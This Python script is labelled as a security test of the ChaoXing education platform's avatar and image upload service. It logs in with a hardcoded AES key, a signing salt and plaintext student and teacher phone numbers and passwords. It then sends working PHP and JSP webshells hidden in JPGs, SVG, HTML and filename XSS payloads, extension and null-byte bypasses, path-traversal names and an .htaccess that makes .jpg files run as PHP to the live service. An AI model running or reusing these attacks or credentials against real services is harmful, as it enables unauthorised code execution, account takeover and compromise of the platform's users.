#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChaoXing 平台头像/图片上传功能安全测试脚本
测试内容: Webshell上传、存储型XSS、文件类型绕过、路径穿越
"""

import base64, hashlib, json, uuid, requests, urllib3, time, io, struct, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from PIL import Image

urllib3.disable_warnings()

# ============ 常量 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
TOKEN_URL = "https://pan-yz.chaoxing.com/api/token/uservalid"
UPLOAD_URL = "https://pan-yz.chaoxing.com/upload"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
STUDENT_PUID = "431407443"

TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
TEACHER_PUID = "402644510"

# 结果收集
results = []

# ============ 登录相关函数 ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    resp = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    print(f"  登录响应: {resp.status_code} - {resp.text[:200] if resp.text else 'No body'}")
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============ 图片生成函数 ============
def create_minimal_jpg():
    """创建最小有效JPG图片"""
    img = Image.new('RGB', (1, 1), color='red')
    buf = io.BytesIO()
    img.save(buf, format='JPEG')
    return buf.getvalue()

def create_jpg_with_php_webshell():
    """JPG + PHP WebShell"""
    jpg_data = create_minimal_jpg()
    webshell = b"<?php eval($_POST['cmd']); ?>"
    return jpg_data + webshell

def create_jpg_with_jsp_webshell():
    """JPG + JSP WebShell"""
    jpg_data = create_minimal_jpg()
    webshell = b"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
    return jpg_data + webshell

def create_jpg_with_html_js():
    """JPG + HTML/JS"""
    jpg_data = create_minimal_jpg()
    payload = b"<html><body><script>alert(document.cookie)</script></body></html>"
    return jpg_data + payload

def create_svg_xss():
    """SVG文件含XSS载荷"""
    return b'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100">
<script>alert('XSS')</script>
<circle cx="50" cy="50" r="40" fill="red"/>
</svg>'''

def create_html_file():
    """HTML文件含XSS"""
    return b'<html><body><script>alert("XSS")</script></body></html>'

def create_jpg_with_exif_xss():
    """创建带EXIF XSS载荷的JPG (通过在JPEG数据后追加注释段)"""
    img = Image.new('RGB', (2, 2), color='green')
    buf = io.BytesIO()
    img.save(buf, format='JPEG')
    data = buf.getvalue()
    # 在JPEG结束标记前插入COM(注释)段, 包含XSS载荷
    xss_payload = b'<script>alert(1)</script>'
    # JPEG COM marker: FF FE + 2-byte length + data
    com_segment = b'\xff\xfe' + struct.pack('>H', len(xss_payload) + 2) + xss_payload
    # 在FFD9(EOI)前插入
    eoi_pos = data.rfind(b'\xff\xd9')
    if eoi_pos != -1:
        data = data[:eoi_pos] + com_segment + data[eoi_pos:]
    return data

# ============ 上传函数 ============
def get_cloud_token(session, puid):
    """获取云盘token"""
    try:
        resp = session.get(TOKEN_URL, params={"puid": puid}, timeout=30)
        print(f"  Token响应: {resp.status_code} - {resp.text[:300]}")
        data = resp.json()
        return data.get("_token", "") or data.get("data", {}).get("_token", "")
    except Exception as e:
        print(f"  获取Token失败: {e}")
        return ""

def do_upload(session, puid, token, filename, file_data, upload_type="face", content_type="image/jpeg"):
    """执行上传操作"""
    files = {
        "file": (filename, file_data, content_type)
    }
    data = {
        "puid": puid,
        "_token": token,
        "uploadtype": upload_type,
    }
    try:
        resp = session.post(UPLOAD_URL, data=data, files=files, timeout=60)
        return resp.status_code, resp.text
    except Exception as e:
        return 0, str(e)

def record_result(test_name, filename, upload_type, status_code, response_text, notes=""):
    """记录测试结果"""
    success = False
    url_returned = ""
    try:
        rj = json.loads(response_text)
        if rj.get("result") == True or rj.get("result") == 1 or rj.get("resultCode") == 1:
            success = True
        # 尝试提取URL
        url_returned = (rj.get("data", {}).get("url", "") or
                       rj.get("data", {}).get("objectId", "") or
                       rj.get("msg", "") or
                       rj.get("data", "") if isinstance(rj.get("data"), str) else "")
        if isinstance(url_returned, dict):
            url_returned = json.dumps(url_returned, ensure_ascii=False)
    except:
        url_returned = response_text[:200]

    # 检测危险结果
    critical_marker = ""
    if success and any(kw in filename.lower() for kw in ['php', 'jsp', 'html', 'svg', 'script', 'htaccess', 'sh', 'py']):
        critical_marker = "!!!CRITICAL!!!"
    elif success and any(kw in filename.lower() for kw in ['onerror', 'onmouseover', 'alert', '<img', '<script']):
        critical_marker = "!!!CRITICAL!!!"
    elif success and notes and "bypass" in notes.lower():
        critical_marker = "***IMPORTANT***"

    result = {
        "test": test_name,
        "filename": filename,
        "upload_type": upload_type,
        "success": success,
        "status_code": status_code,
        "url": str(url_returned)[:200],
        "notes": notes,
        "critical": critical_marker,
        "raw_response": response_text[:500]
    }
    results.append(result)

    marker_str = f" {critical_marker}" if critical_marker else ""
    print(f"  [{test_name}] 文件名={filename} | uploadtype={upload_type} | 成功={success} | 状态码={status_code}{marker_str}")
    print(f"    响应: {response_text[:300]}")
    return result

# ============ 主测试流程 ============
def main():
    print("=" * 80)
    print("  ChaoXing 平台头像/图片上传安全测试")
    print("  测试内容: Webshell上传 / 存储型XSS / 文件类型绕过 / 路径穿越")
    print("=" * 80)

    # ---- 登录 ----
    print("\n" + "=" * 60)
    print("  [登录] 学生账号登录")
    print("=" * 60)
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"  学生PUID: {stu_puid}")
    if not stu_puid:
        stu_puid = STUDENT_PUID
        print(f"  使用预设PUID: {stu_puid}")

    print("\n" + "=" * 60)
    print("  [登录] 教师账号登录")
    print("=" * 60)
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"  教师PUID: {tea_puid}")
    if not tea_puid:
        tea_puid = TEACHER_PUID
        print(f"  使用预设PUID: {tea_puid}")

    # ---- Part 1: 获取Token + 基本上传测试 ----
    print("\n" + "=" * 60)
    print("  [Part 1] 获取云盘Token + 基本图片上传测试")
    print("=" * 60)

    stu_token = get_cloud_token(stu_session, stu_puid)
    print(f"  学生Token: {stu_token[:50] if stu_token else '获取失败'}...")

    tea_token = get_cloud_token(tea_session, tea_puid)
    print(f"  教师Token: {tea_token[:50] if tea_token else '获取失败'}...")

    # 使用学生session进行基本上传
    normal_jpg = create_minimal_jpg()
    for utype in ["face", "normal"]:
        print(f"\n  --- 基本上传: uploadtype={utype} ---")
        code, resp = do_upload(stu_session, stu_puid, stu_token, "normal_avatar.jpg", normal_jpg, upload_type=utype)
        record_result("基本JPG上传", "normal_avatar.jpg", utype, code, resp, "正常JPG图片基线测试")

    # ---- Part 2: 图片Webshell上传测试 ----
    print("\n" + "=" * 60)
    print("  [Part 2] 图片Webshell上传测试")
    print("=" * 60)

    webshell_tests = [
        ("JPG+PHP WebShell", "webshell_php.jpg", create_jpg_with_php_webshell(), "JPG追加PHP WebShell"),
        ("JPG+JSP WebShell", "webshell_jsp.jpg", create_jpg_with_jsp_webshell(), "JPG追加JSP WebShell"),
        ("JPG+HTML/JS", "webshell_html.jpg", create_jpg_with_html_js(), "JPG追加HTML/JS载荷"),
    ]

    for test_name, fname, fdata, note in webshell_tests:
        for utype in ["face", "normal"]:
            print(f"\n  --- {test_name} | uploadtype={utype} ---")
            code, resp = do_upload(stu_session, stu_puid, stu_token, fname, fdata, upload_type=utype)
            record_result(test_name, fname, utype, code, resp, note)

    # ---- Part 3: 存储型XSS测试 ----
    print("\n" + "=" * 60)
    print("  [Part 3] 存储型XSS测试 (文件名注入 / SVG / HTML)")
    print("=" * 60)

    xss_tests = [
        # 文件名XSS
        ("XSS文件名-img标签", '<img src=x onerror=alert(1)>.jpg', create_minimal_jpg(), "image/jpeg", "文件名含img XSS标签"),
        ("XSS文件名-script标签", 'test"><script>alert(1)</script>.jpg', create_minimal_jpg(), "image/jpeg", "文件名含script标签"),
        ("XSS文件名-事件处理", "test' onmouseover='alert(1).jpg", create_minimal_jpg(), "image/jpeg", "文件名含事件处理属性"),
        ("XSS文件名-后缀注入", "test.jpg<script>alert(1)</script>", create_minimal_jpg(), "image/jpeg", "文件名后缀含script标签"),
        # EXIF XSS
        ("EXIF-XSS", "exif_xss.jpg", create_jpg_with_exif_xss(), "image/jpeg", "EXIF注释段含XSS载荷"),
        # SVG XSS
        ("SVG-XSS-真实扩展名", "test.svg", create_svg_xss(), "image/svg+xml", "SVG文件含script标签"),
        ("SVG-XSS-伪装jpg", "test_svg_disguised.jpg", create_svg_xss(), "image/jpeg", "SVG内容伪装为JPG"),
        # HTML伪装
        ("HTML-伪装jpg", "html_disguised.jpg", create_html_file(), "image/jpeg", "HTML内容伪装为JPG"),
    ]

    for test_name, fname, fdata, ctype, note in xss_tests:
        for utype in ["face", "normal"]:
            print(f"\n  --- {test_name} | uploadtype={utype} ---")
            code, resp = do_upload(stu_session, stu_puid, stu_token, fname, fdata, upload_type=utype, content_type=ctype)
            record_result(test_name, fname, utype, code, resp, note)

    # ---- Part 4: 文件类型绕过测试 ----
    print("\n" + "=" * 60)
    print("  [Part 4] 文件类型绕过测试")
    print("=" * 60)

    bypass_tests = [
        # Content-Type欺骗
        ("CT欺骗-php", "test.php", b"<?php phpinfo(); ?>", "image/jpeg", "PHP文件Content-Type伪装为image/jpeg"),
        # 双扩展名
        ("双扩展名-php.jpg", "test.php.jpg", create_minimal_jpg(), "image/jpeg", "双扩展名: .php.jpg"),
        ("双扩展名-jpg.php", "test.jpg.php", b"<?php phpinfo(); ?>", "image/jpeg", "双扩展名: .jpg.php"),
        ("双扩展名-php.jpg.php", "test.php.jpg.php", b"<?php phpinfo(); ?>", "image/jpeg", "双扩展名: .php.jpg.php"),
        # Null byte
        ("Null字节", "test.php\x00.jpg", b"<?php phpinfo(); ?>", "image/jpeg", "文件名含null字节"),
        # 大小写绕过
        ("大小写-PhP", "test.PhP", b"<?php phpinfo(); ?>", "image/jpeg", "大小写绕过: .PhP"),
        ("大小写-JSP", "test.JSP", b"<%out.println(\"test\");%>", "image/jpeg", "大小写绕过: .JSP"),
        ("大小写-HtMl", "test.HtMl", create_html_file(), "image/jpeg", "大小写绕过: .HtMl"),
        # 特殊文件类型
        ("特殊类型-html", "test.html", create_html_file(), "image/jpeg", "上传.html文件"),
        ("特殊类型-htm", "test.htm", create_html_file(), "image/jpeg", "上传.htm文件"),
        ("特殊类型-svg", "test.svg", create_svg_xss(), "image/jpeg", "上传.svg文件"),
        ("特殊类型-xml", "test.xml", b'<?xml version="1.0"?><root>test</root>', "image/jpeg", "上传.xml文件"),
        ("特殊类型-json", "test.json", b'{"xss":"<script>alert(1)</script>"}', "image/jpeg", "上传.json文件"),
        ("特殊类型-txt", "test.txt", b'<script>alert(1)</script>', "image/jpeg", "上传.txt文件含XSS"),
        ("特殊类型-py", "test.py", b'import os; os.system("id")', "image/jpeg", "上传.py文件"),
        ("特殊类型-sh", "test.sh", b'#!/bin/bash\nid', "image/jpeg", "上传.sh文件"),
        # 无扩展名
        ("无扩展名", "test", b'<script>alert(1)</script>', "image/jpeg", "无扩展名文件"),
        # .htaccess
        (".htaccess", ".htaccess", b'AddType application/x-httpd-php .jpg', "image/jpeg", "上传.htaccess文件"),
    ]

    for test_name, fname, fdata, ctype, note in bypass_tests:
        for utype in ["face", "normal"]:
            print(f"\n  --- {test_name} | uploadtype={utype} ---")
            code, resp = do_upload(stu_session, stu_puid, stu_token, fname, fdata, upload_type=utype, content_type=ctype)
            record_result(test_name, fname, utype, code, resp, note)

    # ---- Part 5: 路径穿越测试 ----
    print("\n" + "=" * 60)
    print("  [Part 5] 路径穿越测试")
    print("=" * 60)

    traversal_tests = [
        ("路径穿越-相对路径", "../../../test.jpg", create_minimal_jpg(), "image/jpeg", "../../../路径穿越"),
        ("路径穿越-URL编码", "..%2f..%2f..%2ftest.jpg", create_minimal_jpg(), "image/jpeg", "URL编码路径穿越"),
        ("Null字节中间", "test%00.jpg", create_minimal_jpg(), "image/jpeg", "文件名中间null字节"),
        ("绝对路径", "/etc/passwd.jpg", create_minimal_jpg(), "image/jpeg", "绝对路径尝试"),
    ]

    for test_name, fname, fdata, ctype, note in traversal_tests:
        for utype in ["face", "normal"]:
            print(f"\n  --- {test_name} | uploadtype={utype} ---")
            code, resp = do_upload(stu_session, stu_puid, stu_token, fname, fdata, upload_type=utype, content_type=ctype)
            record_result(test_name, fname, utype, code, resp, note)

    # ---- 教师账号额外测试 ----
    print("\n" + "=" * 60)
    print("  [额外] 教师账号上传测试 (关键测试项)")
    print("=" * 60)

    teacher_key_tests = [
        ("教师-JPG+PHP", "webshell_php.jpg", create_jpg_with_php_webshell(), "image/jpeg", "教师账号上传WebShell"),
        ("教师-SVG-XSS", "test.svg", create_svg_xss(), "image/svg+xml", "教师账号上传SVG XSS"),
        ("教师-CT欺骗-php", "test.php", b"<?php phpinfo(); ?>", "image/jpeg", "教师账号CT欺骗"),
        ("教师-.htaccess", ".htaccess", b'AddType application/x-httpd-php .jpg', "image/jpeg", "教师账号上传.htaccess"),
    ]

    for test_name, fname, fdata, ctype, note in teacher_key_tests:
        for utype in ["face", "normal"]:
            print(f"\n  --- {test_name} | uploadtype={utype} ---")
            code, resp = do_upload(tea_session, tea_puid, tea_token, fname, fdata, upload_type=utype, content_type=ctype)
            record_result(test_name, fname, utype, code, resp, note)

    # ============ 汇总报告 ============
    print("\n" + "=" * 80)
    print("  测试结果汇总报告")
    print("=" * 80)

    # 关键发现
    critical_findings = [r for r in results if r["critical"] == "!!!CRITICAL!!!"]
    important_findings = [r for r in results if r["critical"] == "***IMPORTANT***"]
    successful_uploads = [r for r in results if r["success"]]
    failed_uploads = [r for r in results if not r["success"]]

    print(f"\n  总测试数: {len(results)}")
    print(f"  上传成功: {len(successful_uploads)}")
    print(f"  上传失败: {len(failed_uploads)}")
    print(f"  !!!CRITICAL!!! (Webshell/XSS上传成功): {len(critical_findings)}")
    print(f"  ***IMPORTANT*** (部分绕过): {len(important_findings)}")

    if critical_findings:
        print("\n  " + "!" * 60)
        print("  !!!CRITICAL!!! 严重漏洞发现:")
        print("  " + "!" * 60)
        for r in critical_findings:
            print(f"    - [{r['test']}] 文件名={r['filename']} | uploadtype={r['upload_type']}")
            print(f"      URL: {r['url']}")
            print(f"      响应: {r['raw_response'][:200]}")

    if important_findings:
        print("\n  " + "*" * 60)
        print("  ***IMPORTANT*** 部分绕过发现:")
        print("  " + "*" * 60)
        for r in important_findings:
            print(f"    - [{r['test']}] 文件名={r['filename']} | uploadtype={r['upload_type']}")
            print(f"      URL: {r['url']}")

    # 汇总表格
    print("\n" + "-" * 120)
    print(f"{'测试项':<25} {'文件名':<40} {'UploadType':<10} {'成功':<6} {'URL/响应':<40}")
    print("-" * 120)
    for r in results:
        marker = r["critical"] + " " if r["critical"] else ""
        print(f"{marker}{r['test']:<25} {r['filename']:<40} {r['upload_type']:<10} {str(r['success']):<6} {r['url'][:40]}")
    print("-" * 120)

    print("\n测试完成!")


if __name__ == "__main__":
    main()
